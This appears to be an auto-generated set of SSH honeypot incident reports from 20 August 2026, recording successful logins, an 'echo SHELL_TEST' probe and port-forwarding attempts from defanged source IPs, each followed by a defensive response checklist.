### 🔴 HIGH · IR-90e0c7367d09

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:21` | `cowrie.session.connect` |
| `2026-08-20 08:57:21` | `cowrie.client.version` |
| `2026-08-20 08:57:21` | `cowrie.client.kex` |
| `2026-08-20 08:57:22` | `cowrie.login.success` |
| `2026-08-20 08:57:22` | `cowrie.session.params` |
| `2026-08-20 08:57:22` | `cowrie.command.input` |
| `2026-08-20 08:57:22` | `cowrie.log.closed` |
| `2026-08-20 08:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-419762439db6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:23` | `cowrie.session.connect` |
| `2026-08-20 08:57:23` | `cowrie.client.version` |
| `2026-08-20 08:57:23` | `cowrie.client.kex` |
| `2026-08-20 08:57:23` | `cowrie.login.success` |
| `2026-08-20 08:57:24` | `cowrie.session.params` |
| `2026-08-20 08:57:24` | `cowrie.command.input` |
| `2026-08-20 08:57:24` | `cowrie.log.closed` |
| `2026-08-20 08:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f02d006a4eca

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:24` | `cowrie.session.connect` |
| `2026-08-20 08:57:24` | `cowrie.client.version` |
| `2026-08-20 08:57:24` | `cowrie.client.kex` |
| `2026-08-20 08:57:24` | `cowrie.login.success` |
| `2026-08-20 08:57:25` | `cowrie.session.params` |
| `2026-08-20 08:57:25` | `cowrie.command.input` |
| `2026-08-20 08:57:25` | `cowrie.log.closed` |
| `2026-08-20 08:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f787c8fa1ace

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:25` | `cowrie.session.connect` |
| `2026-08-20 08:57:25` | `cowrie.client.version` |
| `2026-08-20 08:57:25` | `cowrie.client.kex` |
| `2026-08-20 08:57:26` | `cowrie.login.success` |
| `2026-08-20 08:57:26` | `cowrie.session.params` |
| `2026-08-20 08:57:26` | `cowrie.command.input` |
| `2026-08-20 08:57:26` | `cowrie.log.closed` |
| `2026-08-20 08:57:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ff9a35f0493

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:26` | `cowrie.session.connect` |
| `2026-08-20 08:57:26` | `cowrie.client.version` |
| `2026-08-20 08:57:27` | `cowrie.client.kex` |
| `2026-08-20 08:57:27` | `cowrie.login.success` |
| `2026-08-20 08:57:28` | `cowrie.session.params` |
| `2026-08-20 08:57:28` | `cowrie.command.input` |
| `2026-08-20 08:57:28` | `cowrie.log.closed` |
| `2026-08-20 08:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7b05b3e4165

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:28` | `cowrie.session.connect` |
| `2026-08-20 08:57:28` | `cowrie.client.version` |
| `2026-08-20 08:57:28` | `cowrie.client.kex` |
| `2026-08-20 08:57:28` | `cowrie.login.success` |
| `2026-08-20 08:57:29` | `cowrie.session.params` |
| `2026-08-20 08:57:29` | `cowrie.command.input` |
| `2026-08-20 08:57:29` | `cowrie.log.closed` |
| `2026-08-20 08:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-316db40e7256

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:29` | `cowrie.session.connect` |
| `2026-08-20 08:57:29` | `cowrie.client.version` |
| `2026-08-20 08:57:29` | `cowrie.client.kex` |
| `2026-08-20 08:57:30` | `cowrie.login.success` |
| `2026-08-20 08:57:30` | `cowrie.session.params` |
| `2026-08-20 08:57:30` | `cowrie.command.input` |
| `2026-08-20 08:57:30` | `cowrie.log.closed` |
| `2026-08-20 08:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bce8e98fcb0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:30` | `cowrie.session.connect` |
| `2026-08-20 08:57:30` | `cowrie.client.version` |
| `2026-08-20 08:57:31` | `cowrie.client.kex` |
| `2026-08-20 08:57:31` | `cowrie.login.success` |
| `2026-08-20 08:57:32` | `cowrie.session.params` |
| `2026-08-20 08:57:32` | `cowrie.command.input` |
| `2026-08-20 08:57:32` | `cowrie.log.closed` |
| `2026-08-20 08:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4655d8780da

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:32` | `cowrie.session.connect` |
| `2026-08-20 08:57:32` | `cowrie.client.version` |
| `2026-08-20 08:57:32` | `cowrie.client.kex` |
| `2026-08-20 08:57:32` | `cowrie.login.success` |
| `2026-08-20 08:57:33` | `cowrie.session.params` |
| `2026-08-20 08:57:33` | `cowrie.command.input` |
| `2026-08-20 08:57:33` | `cowrie.log.closed` |
| `2026-08-20 08:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0858f12d91c1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 08:57 |
| **Last Seen** | 2026-08-20 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:57:33` | `cowrie.session.connect` |
| `2026-08-20 08:57:33` | `cowrie.client.version` |
| `2026-08-20 08:57:33` | `cowrie.client.kex` |
| `2026-08-20 08:57:34` | `cowrie.login.success` |
| `2026-08-20 08:57:34` | `cowrie.session.params` |
| `2026-08-20 08:57:34` | `cowrie.command.input` |
| `2026-08-20 08:57:34` | `cowrie.log.closed` |
| `2026-08-20 08:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3963ac01f035

| Field | Detail |
|---|---|
| **Source IP** | `31.173.2[.]182` |
| **First Seen** | 2026-08-20 09:01 |
| **Last Seen** | 2026-08-20 09:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:01:55` | `cowrie.session.connect` |
| `2026-08-20 09:01:56` | `cowrie.client.version` |
| `2026-08-20 09:01:56` | `cowrie.client.kex` |
| `2026-08-20 09:01:57` | `cowrie.login.success` |
| `2026-08-20 09:01:58` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.2[.]182` to AbuseIPDB if not already reported
- [ ] Block `31.173.2[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d61705e2d60

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 09:02 |
| **Last Seen** | 2026-08-20 09:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:02:11` | `cowrie.session.connect` |
| `2026-08-20 09:02:11` | `cowrie.client.version` |
| `2026-08-20 09:02:11` | `cowrie.client.kex` |
| `2026-08-20 09:02:15` | `cowrie.login.success` |
| `2026-08-20 09:02:21` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d60cd0bcf67a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 09:05 |
| **Last Seen** | 2026-08-20 09:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:05:31` | `cowrie.session.connect` |
| `2026-08-20 09:05:31` | `cowrie.client.version` |
| `2026-08-20 09:05:32` | `cowrie.client.kex` |
| `2026-08-20 09:05:33` | `cowrie.login.success` |
| `2026-08-20 09:05:33` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:05:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 09:05:33` | `cowrie.direct-tcpip.data` |
| `2026-08-20 09:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cc1044cc6bc

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-08-20 09:09 |
| **Last Seen** | 2026-08-20 09:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:09:13` | `cowrie.session.connect` |
| `2026-08-20 09:09:14` | `cowrie.client.version` |
| `2026-08-20 09:09:14` | `cowrie.client.kex` |
| `2026-08-20 09:09:16` | `cowrie.login.success` |
| `2026-08-20 09:09:17` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b769fbdd18da

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 09:12 |
| **Last Seen** | 2026-08-20 09:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:12:58` | `cowrie.session.connect` |
| `2026-08-20 09:12:58` | `cowrie.client.version` |
| `2026-08-20 09:12:58` | `cowrie.client.kex` |
| `2026-08-20 09:13:01` | `cowrie.login.success` |
| `2026-08-20 09:13:02` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:13:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 09:13:07` | `cowrie.direct-tcpip.data` |
| `2026-08-20 09:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd3b819cbaab

| Field | Detail |
|---|---|
| **Source IP** | `111.39.167[.]59` |
| **First Seen** | 2026-08-20 09:14 |
| **Last Seen** | 2026-08-20 09:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:14:20` | `cowrie.session.connect` |
| `2026-08-20 09:14:21` | `cowrie.client.version` |
| `2026-08-20 09:14:21` | `cowrie.client.kex` |
| `2026-08-20 09:14:23` | `cowrie.login.success` |
| `2026-08-20 09:14:24` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.39.167[.]59` to AbuseIPDB if not already reported
- [ ] Block `111.39.167[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21ebd8f91d06

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 09:16 |
| **Last Seen** | 2026-08-20 09:16 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:16:28` | `cowrie.session.connect` |
| `2026-08-20 09:16:28` | `cowrie.client.version` |
| `2026-08-20 09:16:28` | `cowrie.client.kex` |
| `2026-08-20 09:16:30` | `cowrie.login.success` |
| `2026-08-20 09:16:31` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:16:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 09:16:44` | `cowrie.direct-tcpip.data` |
| `2026-08-20 09:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbc990e03e22

| Field | Detail |
|---|---|
| **Source IP** | `103.171.39[.]147` |
| **First Seen** | 2026-08-20 09:18 |
| **Last Seen** | 2026-08-20 09:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:18:09` | `cowrie.session.connect` |
| `2026-08-20 09:18:09` | `cowrie.client.version` |
| `2026-08-20 09:18:09` | `cowrie.client.kex` |
| `2026-08-20 09:18:11` | `cowrie.login.success` |
| `2026-08-20 09:18:12` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.39[.]147` to AbuseIPDB if not already reported
- [ ] Block `103.171.39[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd44907970c4

| Field | Detail |
|---|---|
| **Source IP** | `183.167.234[.]154` |
| **First Seen** | 2026-08-20 09:18 |
| **Last Seen** | 2026-08-20 09:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:18:19` | `cowrie.session.connect` |
| `2026-08-20 09:18:20` | `cowrie.client.version` |
| `2026-08-20 09:18:20` | `cowrie.client.kex` |
| `2026-08-20 09:18:23` | `cowrie.login.success` |
| `2026-08-20 09:18:24` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:18:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.234[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.167.234[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d62f54e70512

| Field | Detail |
|---|---|
| **Source IP** | `220.180.166[.]214` |
| **First Seen** | 2026-08-20 09:18 |
| **Last Seen** | 2026-08-20 09:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:18:21` | `cowrie.session.connect` |
| `2026-08-20 09:18:22` | `cowrie.client.version` |
| `2026-08-20 09:18:22` | `cowrie.client.kex` |
| `2026-08-20 09:18:25` | `cowrie.login.success` |
| `2026-08-20 09:18:26` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.166[.]214` to AbuseIPDB if not already reported
- [ ] Block `220.180.166[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae56ed9ff515

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 09:23 |
| **Last Seen** | 2026-08-20 09:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:23:43` | `cowrie.session.connect` |
| `2026-08-20 09:23:43` | `cowrie.client.version` |
| `2026-08-20 09:23:43` | `cowrie.client.kex` |
| `2026-08-20 09:23:52` | `cowrie.login.success` |
| `2026-08-20 09:23:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d7d19077c91

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 09:27 |
| **Last Seen** | 2026-08-20 09:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:27:16` | `cowrie.session.connect` |
| `2026-08-20 09:27:16` | `cowrie.client.version` |
| `2026-08-20 09:27:16` | `cowrie.client.kex` |
| `2026-08-20 09:27:18` | `cowrie.login.success` |
| `2026-08-20 09:27:25` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:27:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3353d9fc7125

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 09:34 |
| **Last Seen** | 2026-08-20 09:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:34:11` | `cowrie.session.connect` |
| `2026-08-20 09:34:11` | `cowrie.client.version` |
| `2026-08-20 09:34:12` | `cowrie.client.kex` |
| `2026-08-20 09:34:13` | `cowrie.login.success` |
| `2026-08-20 09:34:15` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:34:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 09:34:17` | `cowrie.direct-tcpip.data` |
| `2026-08-20 09:34:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b10d9817a79

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 09:38 |
| **Last Seen** | 2026-08-20 09:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:38:01` | `cowrie.session.connect` |
| `2026-08-20 09:38:01` | `cowrie.client.version` |
| `2026-08-20 09:38:01` | `cowrie.client.kex` |
| `2026-08-20 09:38:05` | `cowrie.login.success` |
| `2026-08-20 09:38:05` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:38:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 09:38:11` | `cowrie.direct-tcpip.data` |
| `2026-08-20 09:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f4ae6ff58b8

| Field | Detail |
|---|---|
| **Source IP** | `182.156.80[.]11` |
| **First Seen** | 2026-08-20 09:42 |
| **Last Seen** | 2026-08-20 09:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:42:46` | `cowrie.session.connect` |
| `2026-08-20 09:42:47` | `cowrie.client.version` |
| `2026-08-20 09:42:47` | `cowrie.client.kex` |
| `2026-08-20 09:42:50` | `cowrie.login.success` |
| `2026-08-20 09:42:50` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `182.156.80[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-065d73534bbd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 09:44 |
| **Last Seen** | 2026-08-20 09:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
